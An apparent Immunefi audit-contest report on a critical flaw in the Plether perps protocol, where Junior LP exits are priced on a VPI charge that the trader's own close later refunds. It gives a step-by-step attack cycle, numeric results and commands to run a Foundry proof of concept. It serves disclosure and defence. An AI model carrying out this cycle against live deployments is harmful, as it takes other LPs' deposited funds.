# \#97695 [SC-Critical] Junior LP exits are priced on a VPI charge that is refunded at close, letting a trader-LP take other Junior LPs' principal

**Submitted on Nov 2nd 2026 at 18:07:21 UTC by @skydev for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97695
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

**Severity:** Critical

**Impact:** Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

**Code:** `packages/perps/src` at `a82d4fefb02768e5b3bddcc97dee371eee24fea8` (HousePool, TrancheVault, CfdEngineSettlementSidecar, CloseAccountingLib, CfdEnginePlanLib)

Why this impact:

- **The market has no revenue.** The PoC market has zero open interest and no trader other than the attacker. In the time-matched control, Junior value changes only by the Senior coupon it pays: an independent 100,000 USDG Junior LP redeems 99,995.85, and the treasury receives nothing.
- **An LP that never interacts with the attacker realizes the loss.** With the attack, the same LP redeems 99,802.19 after one cycle (193.66 less than in the control) and 581.14 less after three cycles. All non-attacker Junior holders lose 2,130.23 in that cycle. Of that, 1,318.32 goes to the attacker after all protocol fees (gas and Pyth update fees excluded) and 811.91 goes to the protocol treasury as the open-leg fee. Senior is unchanged, and conservation holds to the atom.
- **The value taken is deposited capital, not yield.** The only VPI (virtual price impact) on this market is the attacker's own charge. The attacker's exit counts that charge as Junior equity. The attacker's close then pays the charge back to it from pool cash as the ordinary skew-restoring rebate, which the lifetime clamp caps at C, and the LPs who remain fund that payment from their deposits.

## Brief/Intro

`CloseAccountingLib.sol:112-114` gives the purpose of the lifetime VPI clamp:

> Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks where an attacker opens at high depth, reduces pool depth, then closes to extract a net-negative lifetime VPI rebate.

The clamp does remove the trade-side profit of that sequence: here the attacker's lifetime VPI is exactly zero (asserted). The LP side of the same sequence still pays. Junior entry and exit are priced at the hourly epoch settlement, on a NAV that counts an open position's VPI charge as final pool revenue, and the position's close later pays that charge back to the trader. An account that is both a trader and a Junior LP does three things:

1. Shortly before the settlement of its own exit epoch (19 s before the epoch boundary in the PoC, after the request cutoff), it opens a skew-increasing position and pays a VPI charge C into HousePool.
2. It redeems its Junior shares at the settlement, at a NAV that includes C.
3. It closes right after. The close restores the skew and earns the ordinary VPI rebate from pool cash, which the lifetime clamp caps at exactly C. The rebate is C in the base case and C − 0.87 in the constant-depth run, where the clamp does not bind; the attacker's gain differs by less than 1 USDG.

Its VPI nets to zero or slightly above, and its redemption carries θ·C, where θ is its share of Junior. The Junior LPs who remain pay the refund. The attacker's main cost is two 4 bps execution fees. At the skew cap C is about 0.2 % of the leg's notional and the two fees are 0.08 %, so the attack is profitable once θ is above about 0.4 at the release parameters.

Toy example (fees ignored):

1. Junior holds 4,000 USDG: other LPs 1,000, attacker 3,000 (θ = 0.75).
2. The attacker opens a skew-increasing position and pays VPI C = 40 into the pool. Junior NAV is now 4,040.
3. At the exit settlement the attacker redeems 0.75 × 4,040 = 3,030.
4. The attacker closes, and the skew-restoring rebate pays the 40 back from pool cash (the clamp caps it at 40). Its lifetime VPI is 0.
5. The other LPs now hold 4,040 − 3,030 − 40 = 970. They lost 30 = θ·C, and the attacker gained 30.

Results of the attached Foundry test (the repository suite at a82d4fef, release parameters, one attacker address, public entrypoints only, constant price):

- **One cycle:** the attacker nets +1,318.32 after fees. An independent 100,000 USDG Junior LP realizes 193.66 less than in the time-matched control. All other Junior holders lose 2,130.23 and the treasury receives 811.91. Senior is unchanged.
- **Three cycles** at the three-hour minimum cadence: the attacker nets +3,957.82, other Junior holders lose 6,392.53, and the independent LP realizes 581.14 less.
- **Same gain without a depth drop:** the attacker still nets +1,317.46 when an unrelated deposit keeps pool depth from falling, so the clamp does not bind (this is not the issue in AI scan items 30 and 31, which concern close-time depth changing the trader's VPI).
- **Minority attacker:** with only `A` on line 40 of the test set to `900_000e6` (θ = 0.45), all four tests still pass. The attacker nets +105.70, +106.04 and +106.38 in the three cycles, and the independent LP realizes 53.02 less than in the control after one cycle (159.14 less after three).

## Vulnerability Details

### 1. Junior entry and exit are priced on one post-reconcile principal

`HousePool._settleLpEpoch` reconciles once and prices both Junior redemptions and Junior deposits on the result:

```solidity
// src/HousePool.sol:835, :840-841, :915-916
_reconcile(accountingSnapshot, statusSnapshot);
...
juniorPhase.pricingPrincipal = juniorPrincipal;      // redemptions, funded at :881-888
juniorPhase.pricingSupply = _juniorShareSupply();
...
juniorDepositPhase.pricingAssets = juniorPrincipal;  // deposits, settled at :917-920
juniorDepositPhase.pricingSupply = _juniorShareSupply();
```

Reconcile measures distributable equity as `physicalAssets + max(terminalDelta, 0) - traderClaims - max(-terminalDelta, 0)` (`src/libraries/HousePoolAccountingLib.sol:60-78`).

- `physicalAssets` is `HousePool.totalAssets()` (`src/CfdEngineProtocolLens.sol:62-64`; `src/HousePool.sol:426-429`).
- `terminalDelta` is the LP-side marked price P&L of open positions. A positive receivable is capped per account at `pnlPledgeAssets + traderClaimBalanceAssets` (`src/TerminalNavBookV2.sol:430-434`), and a negative value is the amount owed to the trader. VPI is excluded from it by design (`ACCOUNTING_SPEC.md:140-142`).

A surplus first restores the Senior high-water mark and then goes to Junior. A shortfall is absorbed by Junior first (`src/libraries/HousePoolReconcilePlanLib.sol:84-105`; `src/libraries/HousePoolWaterfallAccountingLib.sol:140-159`, `:167-184`). Outside oracle-frozen hours the LP settlement fee is zero (`src/HousePool.sol:1147-1155`). So, with Senior at its high-water mark (the normal state), any VPI cash in the pool is Junior equity at the next settlement.

### 2. Open: the VPI charge becomes Junior equity

VPI is the change in `cost(S) = k·S²/(2D)` between the skew before and after a trade, at the current net depth D (`src/CfdMath.sol:96-180`; open depth at `src/libraries/CfdEnginePlanLib.sol:448-449`). On a skew-increasing open, the clearinghouse debits C plus the fee, credits the fee to the treasury and sends C to the pool (`src/MarginClearinghouse.sol:1072-1103`). The settlement sidecar books C as revenue:

```solidity
// src/CfdEngineSettlementSidecar.sol:454-463
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool()).recordClaimantInflow(
            poolCashInflowAssets, IHousePool.ClaimantInflowKind.Revenue, IHousePool.ClaimantInflowCashMode.CashArrived
        );
```

`CashArrived` raises `accountedAssets` at once (`src/HousePool.sol:640-642`). The position records `vpiAccrued = C`.

### 3. Close: the skew-restoring rebate pays the charge back

```solidity
// src/libraries/CloseAccountingLib.sol:107-118
if (inputs.poolDepthAssets != 0) {
    state.vpiDeltaAssets = CfdMath.calculateVPI(
        inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
    );
}
// Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks
// where an attacker opens at high depth, reduces pool depth, then closes to extract a
// net-negative lifetime VPI rebate. ...
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

- **Close VPI.** A full close that restores the skew gets a fresh rebate at the close-time net depth (`src/libraries/CfdEnginePlanLib.sol:1339-1341`). At an unchanged price and a depth no higher than at the open, that rebate is at least C, so the clamp sets the close VPI to exactly −C. If depth is higher at the close, the rebate is below C and the trader pays the difference as net VPI.
- **Rebate payout.** The net action amount (close VPI + fee + carry) is negative, so the pool pays it to the trader as an action rebate from free pool cash (`src/libraries/CfdEnginePlanLib.sol:1041-1061`, `:970-978`; `src/CfdEngineSettlementSidecar.sol:621-624`).
- **Close fee.** On this net-rebate close the execution fee is netted against the rebate instead of being credited to the treasury (`src/libraries/CfdEnginePlanLib.sol:1063-1073`), so it stays in the pool.

### 4. Root cause

Settlement prices Junior shares as if an open position's VPI charge were final pool revenue, but the position's own close pays that charge back to its payer. A full close that restores the skew earns the ordinary VPI rebate, which the lifetime clamp caps at exactly C: the rebate is C in the base case, where depth has fallen since the open, and C − 0.87 in the constant-depth run, where the clamp does not bind and the attacker's gain is within 1 USDG of the base case. The trader's own VPI over the round trip is zero or slightly positive, as the clamp intends (`SECURITY.md:1443`); the defect is that a Junior exit is priced between the charge and its return. The reconcile snapshot has no term for the VPI that open positions can still recover at close. This has three consequences:

- a Junior exit settled while such a charge is in the pool is overpaid by the leaver's share of it (θ·C is the leading term);
- a Junior entry settled at the same time pays a NAV that includes the charge, and later bears its share of the refund;
- the refund is later paid, pro rata, by whoever holds Junior at the close.

An account that is both trader and Junior LP can create the charge on demand and place its own exit between the charge and the refund.

### 5. Why existing controls do not stop it

- **Cooldown.** The anti-flash control (`WHITEPAPER.md:715-721`) is the one-hour cooldown between deposit activation and a redemption request (`src/TrancheVault.sol:38`, `:617-619`, `:1107-1111`). The cycle respects it. The cooldown makes the cycle three hours long but does not change the amount moved.
- **Deposit size.** Junior deposit requests are uncapped (`src/TrancheVault.sol:1313-1326`).
- **Execution.** Order execution and LP settlement are permissionless (`src/OrderRouter.sol:233-247`, `:474-484`). The attacker executes its own orders and needs no other party.
- **Request cutoff.** The five-minute cutoff (`src/TrancheVault.sol:39`, `:545-556`) does not stop it. Opening the leg after the cutoff keeps other Junior LPs out of the same exit, but it is not needed: opening it about an hour earlier moves the same amount (Impact Details).

### 6. One cycle, as run in the PoC

Activation epoch e (Monday 10:00Z in the PoC); one address; public entrypoints only.

| Time | Action | Effect (PoC values, USDG) |
|---|---|---|
| e − 50 min | `juniorVault.requestDeposit(3,000,000)` | queued for epoch e |
| e + 10 s | `router.settleLpEpoch` (any caller); `claimDeposit` | shares at the fair NAV, no position open; θ = 0.7317 |
| e + 1 h + 11 s | `requestRedeem(all shares)` | cooldown over; queued for epoch e + 2 h |
| e + 2 h − 20 s / − 19 s | `clearinghouse.deposit`; `router.commitOrder` (LONG, 0.398 × net depth); own `router.executeOrder` | after the e + 2 h cutoff; C = 4,039.25 enters pool cash |
| e + 2 h + 10 s | `router.settleLpEpoch`; `claimRedeem` | exit priced with C in Junior principal, fully funded |
| e + 2 h + 12 s / + 13 s | `commitOrder` (full close); own `executeOrder`; `withdraw` | depth 2.10M (5.10M at the open); fresh rebate 9,804.47; clamp: close VPI = −4,039.25 |

The next cycle activates at e + 3 h.

### 7. Fix direction

Recognize VPI in LP NAV only once it is final for its position:

- Keep a signed aggregate of open positions' `vpiAccrued`, updated wherever `vpiAccrued` changes (open, increase, partial or full close, liquidation).
- In the reconcile snapshot, treat its positive part as a liability: charges that the payer's close can still return.
- Treat its negative part as a receivable: rebates already paid, backed one-for-one by the nonwithdrawable reserve.

A VPI round trip then leaves Junior NAV unchanged at every settlement, and entry and exit keep a single price. Changing fees, vpiFactor or the skew cap only moves the break-even share, and a longer cooldown only lengthens the cycle.

## Impact Details

### Single cycle against the control

`test_lateVchg_singleCycle` runs on a market that `setUp` builds through public LP routes: Junior 1,000,000 plus an independent 100,000 LP, Senior 1,000,000, and zero open interest. The attacker deposits 3,000,000. Control and attack run from one snapshot at identical timestamps (asserted).

| USDG | Control | Attack | Attack − control |
|---|---|---|---|
| Attacker net (wallet minus USDG minted to it) | 0 | 1,318.319349 | +1,318.319349 |
| Independent 100k Junior LP, realized redemption | 99,995.848841 | 99,802.191798 | −193.657043 |
| All non-attacker Junior holders, value at e + 2 h + 5 min | 1,099,965.732704 | 1,097,835.498434 | −2,130.234270 |
| Senior | 1,000,038.267295 | 1,000,038.267295 | 0 |
| Protocol treasury | 0 | 811.914921 | +811.914921 |

- **Conservation.** 2,130.234270 = 1,318.319349 + 811.914921 (residual 0 atoms).
- **Mechanism.** The leg notional is 2,029,787.30 (0.398 × open depth 5,100,003.00, rounded down to 21,129 whole 100-token lots). C = 4,039.249092. Pool cash rose by exactly C at the open, and the close VPI is −C.
- **Attacker split.** The LP leg made +2,942.195014: θ·C = 2,955.56 less the attacker's share of the two-hour Senior coupon. The trade leg made −1,623.875665: execution fees of 1,623.829842 and carry of 0.05.
- **Control.** The independent LP's 4.15 shortfall is its share of the Senior coupon, and the treasury receives nothing. This market has no trading revenue.

### Three cycles

`test_threeCycles` (activations at 10:00Z, 13:00Z and 16:00Z):

| Cycle | C | Attacker, this cycle | Other Junior vs control, cumulative | Treasury, cumulative |
|---|---|---|---|---|
| 1 | 4,039.25 | +1,318.32 | −2,130.23 | +811.91 |
| 2 | 4,037.49 | +1,319.27 | −4,261.08 | +1,623.48 |
| 3 | 4,035.74 | +1,320.23 | −6,392.53 | +2,434.71 |

The independent LP then realizes 99,409.731226, against 99,990.867214 in the control (−581.135988). Senior is equal to the atom at every checkpoint, and the conservation residual is 0 atoms in every cycle.

### Constant-depth run: the gain does not come from close-time depth

In `test_constantDepthControl`, an unrelated account requests a 3,000,000 Junior deposit for the exit epoch before the cutoff, before the leg exists. The deposit activates at the exit settlement, so depth at the close (5,101,101.09) is not below depth at the open (5,100,003.00).

- **Close VPI.** It is −4,038.379579, the unclamped curve value (within 1 atom). The clamp does not bind, and the trader pays +0.87 net VPI.
- **Attacker.** It still nets +1,317.455249, against +1,318.319349 when the clamp binds.
- **Who pays.** The unrelated depositor, admitted at the C-inflated price, loses 2,360.19. Pre-existing Junior holders net +230.82, of which the independent LP +20.98. All non-attacker Junior holders together lose 2,129.37. Senior is unchanged and conservation is 0 atoms.

The loss falls pro rata on whoever holds Junior when the refund is paid. In the base case that is the incumbents; in this run it is mostly the entrant.

### Leg opened before the cutoff: the timing is not the source

- **Change.** Only line 179 of the attached test, to `_openLeg(c, c.e + 1 hours + 30);`. The leg then fills about 55 minutes before the request cutoff and an hour before the settlement. The printed header is fixed text and still says `filled e+2h-19s`.
- **Result.** All four tests still pass. The LP leg again gains +2,942.20, and the attacker nets +1,313.84 against +1,318.32; the difference is about an hour of extra carry (4.48). The independent LP realizes 193.25 less than in the control.

<details>
<summary>Feasibility under the program rules, and relation to documentation and known issues</summary>

### Feasibility under the program rules

- **Capital.** The program's Attack Investment Amount standard says: "A high capital requirement is generally not a valid reason to downgrade a report. Attacks requiring USD 100 million or more to execute are considered case by case."
  - The PoC uses 3,000,000 plus about 30,500 of trading collateral. The break-even is about 0.7 times the other Junior holders' capital.
  - The capital is not consumed. The deposit is in escrow from the request (50 minutes before activation here, at most 65) and returns at the exit, about two hours after activation. The collateral is in use for about 30 seconds.
  - Flash loans do not apply, because entries settle by epoch.
  - Each cycle earns the attacker about 0.04 % of the capital used.
- **Attacker risk.** The program says: "Financial risk to the attacker only justifies a downgrade where the risk massively outweighs the reward. Low return on investment alone is not sufficient, and high risk alongside high return is not sufficient either." The position is open for about 30 seconds, and θ·C does not depend on price movement.
- **No special conditions.**
  - One address, no privileged role, no oracle manipulation and no directional price prediction.
  - It uses only features active at launch (trading, the Junior tranche, permissionless keepers), at the release parameters in `DEPLOYMENT.md`, which the PoC sets and asserts.
  - Cycles run on trading days outside oracle-frozen windows, up to eight a day.
- **Not a majority or governance attack.** The attacker's Junior share controls nothing; it only sets the attacker's pro-rata part of the overpaid exit, and no majority is needed. With only the constant `A` on line 40 of the attached test changed, all four tests still pass with every assertion, and conservation still holds to 0 atoms:

  | `A` | θ | Attacker net per cycle (cycles 1, 2, 3) | Independent LP, realized vs control (after 1 / 3 cycles) |
  |---|---|---|---|
  | `1_100_000e6` | ~0.50 (0.5000-0.5003) | +239.14, +239.54, +239.93 | −68.05 / −204.23 |
  | `900_000e6` | 0.45 (0.4500-0.4502) | +105.70, +106.04, +106.38 | −53.02 / −159.14 |

  To reproduce, set line 40 to `uint256 internal constant A = 1_100_000e6;` (or `900_000e6`) and run the PoC command; the printed labels are fixed text and still say 3,000,000 and 3M.
- **Containment.** The rules allow a containment downgrade only with demonstrated monitoring coverage and response timing. The cycle creates no accounting inconsistency, since conservation is exact, and the leg is open for about 30 seconds around the settlement.
- **Scale.** C is proportional to pool depth at a given skew ratio. At a fixed attacker share, the amount moved per cycle grows linearly with the pool.

### Relation to documentation and known issues

| Passage | What it says | Delta |
|---|---|---|
| Cash-basis VPI: `ACCOUNTING_SPEC.md:140-142`, `:1064-1066`; `SECURITY.md:863`, `:871-872`; `WHITEPAPER.md:411-413`, `:811`; public docs (docs.plether.com, source `Plether-Fi/plether-app` `apps/gitbook/` at `abb3aa962a0842d2187dbf44759c1e0b7ce5e595`): `liquidity-provider-quickstart.md:61`, `how-plether-works/trading-costs-fees-carry-and-vpi.md:132` | VPI is a realized-settlement quantity outside the marked price book. A positive charge raises pool assets when paid and a rebate lowers them. Anticipated VPI and its reserve do not inflate NAV. Share value can rise with positive VPI. | These passages describe the cash flows, which the PoC reproduces as written; the defect is their use as final equity in LP entry and exit pricing while the payer can still recover the charge at close. None of them covers an LP exit priced on a charge that the payer's close returns after that exit. The rebate side does get that protection: the reserve "cannot be extracted by LPs before its account obligation settles" (`ACCOUNTING_SPEC.md:821-822`; `WHITEPAPER.md:887-888`), and the public docs call open-time negative VPI "provisional" (`trading-costs-fees-carry-and-vpi.md:198`, `:227`). The positive side, which "a closing rebate can offset" (`:225`), is counted as final at once. |
| Collection-time ownership of carry: `ACCOUNTING_SPEC.md:731-740`; `WHITEPAPER.md:966-977` | Carry belongs to the shares outstanding when it is collected. The policy allows "a trader and incoming LP" to time collection after activation and share carry accrued before entry. It "is a collection-time ownership policy, not a claim that timing cannot transfer part of old carry revenue to a new LP". | The acceptance is limited to carry, which differs on each point that matters. Carry is accrued rent that the trader owes whatever the timing. Once collected it is final revenue, bounded by organic accrual. Timing only changes which LPs share a gain: incumbents receive less revenue, never less than their capital. The VPI charge here is created on demand by the attacker and paid back to it by its own close after its exit, so it never becomes final revenue. The refund is paid out of the remaining LPs' deposited capital. This market has no revenue to share (see the control), yet with the attack the independent LP loses 193.66 of principal. The documents contain no VPI counterpart of this acceptance. |
| LP request cutoff: `SECURITY.md:1036-1065`, in particular `:1044-1048`; `ACCOUNTING_SPEC.md:228-229`; `WHITEPAPER.md:679-681` | The five-minute cutoff is a maximum-membership quiet period, "not an immutable settlement snapshot". Before settlement, "trading, closes, liquidations, claims, carry, and pool accounting can change NAV". Monitors treat request totals as upper bounds. | The attack does not depend on this passage. Opening the leg about 55 minutes before the cutoff moves the same amount (attacker +1,313.84, independent LP −193.25; see Impact Details); late timing only removes price exposure and the incumbents' chance to react. The passage describes NAV changes that every holder in the epoch bears alike. The defect is that this change is counted as final although the payer's close returns it right after the settlement. So the leaving LP is overpaid, and an entering LP overpays (constant-depth run). This section is documentation; it is not one of the SECURITY.md sections listed as known issues. |
| Epoch timing: `WHITEPAPER.md:734-746`, `:1793-1796` | Entry and exit consume one snapshot. Epochs "do not remove ordinary timing and liveness risk", and requests have no share-price limit. | Entry and exit are priced alike, as stated. The problem is what that snapshot counts as equity. Timing risk is a requester's exposure to genuine NAV moves before settlement. Here an LP creates the NAV move itself, and its own close reverses it after the settlement. |
| VPI path dependence: `WHITEPAPER.md:859-869`, `:1777-1780` | Changing depth and lifetime clamps alter VPI path outcomes. | These passages are about the trader's VPI amount. Here it is exactly 0 when the clamp binds, and +0.87 (paid by the trader) when depth does not fall. |
| Known issue, SECURITY.md Known Limitations: VPI limitations `:1434-1444`, including `:1443` "the lifetime clamp intentionally zeroes otherwise extractable rebate-only round trips"; LP accounting limitations `:1380-1399` | Trader-side VPI rules; LP accounting caveats. | The VPI bullets describe the trader-side VPI amount, which behaves as documented: zero over the round trip when the clamp binds, and +0.87 (paid by the trader) when it does not. The LP accounting bullets cover mark freshness, receivables versus cash, the non-upgradeable terminal book, frozen settlement, backlog passes, the Senior coupon cap, Senior limits and reservations, and cooldown lot timestamps. None addresses VPI in LP pricing, or LP timing around open positions' VPI. The cycle respects the cooldown rules at `:1396-1399`. The other Known Limitations subsections (oracle and market-closure `:1330-1342`, Router and keeper `:1343-1379`, LP claim and allocation `:1401-1420`, rounding `:1421-1433`, clearinghouse `:1446-1457`) and the separately listed live basket component selection (`:687-700`) do not address VPI in LP pricing either. |
| Known issue, AI scan items 30 and 31: "Temporary pool liquidity can reduce a skew-increasing close charge" and "Temporary pool-liquidity reduction can amplify a skew-reducing close rebate" (`audits/scan-plether-fi-plether-core-d4541b49.md:1693-1741`, `:1742-1810`) | Close VPI uses execution-time depth. An LP/trader that moves liquidity around its own close can lower a close charge, or enlarge a close rebate within the clamp. | Measured, not argued. When depth falls, the close VPI is exactly −C (the clamp binds). When an unrelated deposit keeps depth at the close above depth at the open, the close VPI equals the unmanipulated curve value and the trader pays +0.87 net VPI. The attacker's gain is nearly the same in both runs (+1,318.32 and +1,317.46). It is realized through the Junior redemption price at settlement, which neither item mentions. |
| Known issue, Arbitrum and Pyth clock alignment (HIGH-1) | A trader may commit after a price is published and be filled at it. | Not used. The PoC runs at one constant price with zero confidence, and the gain θ·C − fees does not depend on the price (the leg is sized as a fraction of depth). |
| Cecuro AI audit; SC Audit Studio pre-audit | n/a | Neither report has a finding on LP entry or exit pricing against open positions' VPI. |

</details>

## Variants of the same root cause (not separate findings)

**Entry side.** The same gap works when the attacker enters rather than exits.

- **Mechanism.** A skew-reducing open receives a VPI rebate R from pool cash, while the matching reserve stays in the clearinghouse outside NAV (`src/CfdEngineSettlementSidecar.sol:442-444`, `:466-477`; `src/libraries/CfdEnginePlanLib.sol:343-349`). A Junior deposit settled while R is outstanding enters at a NAV lowered by R. The close then charges at least R back into the pool (`src/CfdEngineSettlementSidecar.sol:604-613`, `:690-693`).
- **Precondition.** It needs existing one-sided skew from other traders, which the PoC market does not have.
- **Result.** Not demonstrated in the attached test; not claimed here.

**Both directions in one LP round trip.** A rebate leg before the entry and a charge leg before the exit add up, and with organic skew this lowers the break-even share. Not claimed here.

The fix direction above (an aggregate of open positions' lifetime VPI in the reconcile snapshot) covers both variants.

## References

Repository links are at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`; public-docs links are at `Plether-Fi/plether-app` commit `abb3aa962a0842d2187dbf44759c1e0b7ce5e595`.

- **Lifetime clamp:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L118
- **Open VPI booked as revenue:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L454-L463
- **LP epoch pricing:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L835-L920
- **Reconcile equity:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L60-L78
- **Close action rebate and fee netting:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1036-L1074
- **Cooldown, cutoff and uncapped Junior deposit requests:**
  - https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L38-L39
  - https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L545-L556
  - https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L617-L619
  - https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1313-L1326
- **Release parameters:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md?plain=1#L123-L156
- **Documentation:**
  - https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L1036-L1065
  - https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L1380-L1444
  - https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md?plain=1#L140-L142
  - https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md?plain=1#L731-L740
  - https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md?plain=1#L679-L681
  - https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md?plain=1#L734-L746
  - https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md?plain=1#L966-L977
- **Public docs:**
  - https://github.com/Plether-Fi/plether-app/blob/abb3aa962a0842d2187dbf44759c1e0b7ce5e595/apps/gitbook/liquidity-provider-quickstart.md?plain=1#L61
  - https://github.com/Plether-Fi/plether-app/blob/abb3aa962a0842d2187dbf44759c1e0b7ce5e595/apps/gitbook/how-plether-works/trading-costs-fees-carry-and-vpi.md?plain=1#L132
  - https://github.com/Plether-Fi/plether-app/blob/abb3aa962a0842d2187dbf44759c1e0b7ce5e595/apps/gitbook/how-plether-works/trading-costs-fees-carry-and-vpi.md?plain=1#L198
  - https://github.com/Plether-Fi/plether-app/blob/abb3aa962a0842d2187dbf44759c1e0b7ce5e595/apps/gitbook/how-plether-works/trading-costs-fees-carry-and-vpi.md?plain=1#L225-L227
- **AI scan items 30 and 31:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md?plain=1#L1693-L1810

## Link to Proof of Concept

https://gist.github.com/Skydev0h/c6150395f64f5ad33f77116cbaeeb1a0

## Proof of Concept

## Proof of Concept

**Environment.** The test runs in the repository's Foundry suite at `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, which is one of the two allowed environments.

- **File.** One new file, `packages/perps/test/poc/C03LateVchgJuniorDilution.t.sol` (in the unlisted Gist https://gist.github.com/Skydev0h/c6150395f64f5ad33f77116cbaeeb1a0 and inlined below; 829 lines; sha256 `3daea712d9bf6865274455a8d53beb3d8ee6cdb0e0976c68d8712e9e94e632f9`).
- **Base.** It inherits the suite's `test/perps/BasePerpTest.sol` unchanged. No in-scope contract is modified.
- **Mocks.** Only out-of-scope components are mocked. MockPyth supplies explicit payloads with both basket feeds at a constant 0.96066417 and zero confidence (fills execute at 0.96066416), and the suite's mintable six-decimal token stands in for USDG. `PletherOracle` itself is the in-scope contract, unmodified, configured by `BasePerpTest` with the suite's two mock feeds. The gain, θ·C − fees, does not depend on the price level: the leg is sized as a fraction of pool depth, so C (about 0.2 % of the leg's notional) and the two fees (0.08 %) both scale with depth, not with the price.
- **Configuration.**
  - In `setUp`, the deployer sets the release parameters from `DEPLOYMENT.md` (those the release sets in its constructors go through the owner's timelocked setters here) and asserts 23 values. These include vpiFactor 0.01e18, maxSkewRatio 0.4e18, execution fee 4 bps, IM 0.2 %, MM 0.1 %, frozen margin 3 %, frozen close spread 0.50 %, Senior cap 40M / 80 %, liquidation charge 10 bps with a 1 USDG minimum, protocol share 0, Junior fee 0, and Senior rate 8 % (the HousePool constructor default, `src/HousePool.sol:251`).
  - The market is then built through public LP routes (request, settle, claim).
- **Actions.**
  - After `setUp`, only public entrypoints are called: TrancheVault request and claim, `Router.settleLpEpoch` from a neutral caller, `Router.commitOrder` with the production V3 request plus `Router.executeOrder` by the attacker on its own order, and MarginClearinghouse deposit and withdraw.
  - The test uses no `vm.store`, `vm.etch` or `vm.mockCall`, and pranks no protocol contract.
  - `BasePerpTest` deploys the Router as the suite's `LegacyOrderRouterHarness`, which inherits `OrderRouter`, overrides nothing, and adds only an unused scalar `commitOrder` overload and an `IS_TEST` marker; every Router call in the PoC runs `OrderRouter`'s own code.
- **Controls.** Each attack test (1, 3, 4) runs the control (same schedule and LP/oracle actions, attacker switched off) and the attack from one snapshot, at identical timestamps (asserted); test 3 also re-runs the clamp-binding case as a reference. Both runs include a 1 USDG bystander Junior request before every cycle settlement, because a settlement with no LP work reverts (`HousePool__NoLpEpochProgress`). Those requests are counted among the other Junior holders.
- **Labels.** The test output calls this cycle "late V-chg": a VPI charge leg opened late in the exit epoch.

**Run.**

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git && cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8 && git submodule update --init --recursive
git clone https://gist.github.com/Skydev0h/c6150395f64f5ad33f77116cbaeeb1a0 c03-poc
mkdir -p packages/perps/test/poc && cp c03-poc/C03LateVchgJuniorDilution.t.sol packages/perps/test/poc/
FOUNDRY_SPARSE_MODE=true forge test --root packages/perps --match-path test/poc/C03LateVchgJuniorDilution.t.sol -vv
```

The toolchain is Forge 1.7.1 with solc 0.8.35 via-IR, from the repository config. A cold compile takes about 32 s, and the four tests run in about 30 ms. It also passes unchanged under Forge 1.5.1, the version on the program page, with the same numbers and gas. `FOUNDRY_SPARSE_MODE` limits compilation to the files this test needs.

**Expected output** (excerpt from `test_lateVchg_singleCycle`; the run ends with `4 passed; 0 failed`):

```text
===== (1) late V-chg, one cycle: control vs attack at identical timestamps
  pool: Junior 1M victim + 100k independent + 1 seed, Senior 1M + 1 seed, zero OI, mark 0.96066417
